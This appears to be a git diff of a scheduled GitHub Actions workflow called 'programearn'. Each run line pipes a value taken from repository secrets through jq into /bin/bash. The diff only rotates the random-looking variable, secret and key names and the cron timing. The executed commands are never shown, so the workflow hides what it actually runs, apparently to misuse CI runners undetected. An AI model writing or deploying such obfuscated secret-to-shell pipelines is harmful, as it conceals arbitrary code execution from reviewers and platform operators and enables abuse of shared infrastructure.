@@ -1,9 +1,8 @@
 name: programearn
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '53 2/6 * * *'
+    - cron: '52 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,20 +10,19 @@ jobs:
       - uses: actions/checkout@v4
       - name: programearn
         env:
-          v5421: ${{ secrets.v5421 }}
+          oj7946: ${{ secrets.oj7946 }}
         run: |
-          echo $v5421 | jq -r .jfbwh914 | /bin/bash
-          echo $hl2125 | jq -r .av3 | /bin/bash
-          echo $dn2676 | jq -r .dn57 | /bin/bash
-          echo $jtjij4049 | jq -r .ylfan4011 | /bin/bash
-          echo $hm5 | jq -r .vfu8 | /bin/bash
-          echo $fey2671 | jq -r .tnlb878 | /bin/bash
-          echo $cy80 | jq -r .dxmhv726 | /bin/bash
-          echo $g4 | jq -r .lhd4298 | /bin/bash
-          echo $wzy88 | jq -r .wsmnr3 | /bin/bash
-          echo $ykqi731 | jq -r .raqj40 | /bin/bash
-          echo $sala9305 | jq -r .cr69098 | /bin/bash
-          echo $aqdbx60402 | jq -r .b23 | /bin/bash
-          echo $fbx81 | jq -r .o4266 | /bin/bash
-          echo $k8009 | jq -r .vs9279 | /bin/bash
+          echo $oj7946 | jq -r .pc79 | /bin/bash
+          echo $b7 | jq -r .e0690 | /bin/bash
+          echo $b1073 | jq -r .j4340 | /bin/bash
+          echo $nr3659 | jq -r .kzm0911 | /bin/bash
+          echo $y70 | jq -r .tcm6 | /bin/bash
+          echo $fagmq0 | jq -r .hxe06620 | /bin/bash
+          echo $zldts50390 | jq -r .vghoz9348 | /bin/bash
+          echo $vw94 | jq -r .zhw29 | /bin/bash
+          echo $plhob516 | jq -r .df4 | /bin/bash
+          echo $i0 | jq -r .s2 | /bin/bash
+          echo $qss32 | jq -r .k849 | /bin/bash
+          echo $amlge72 | jq -r .vqim255 | /bin/bash
+          echo $gadrn073 | jq -r .ayfdm42328 | /bin/bash
 
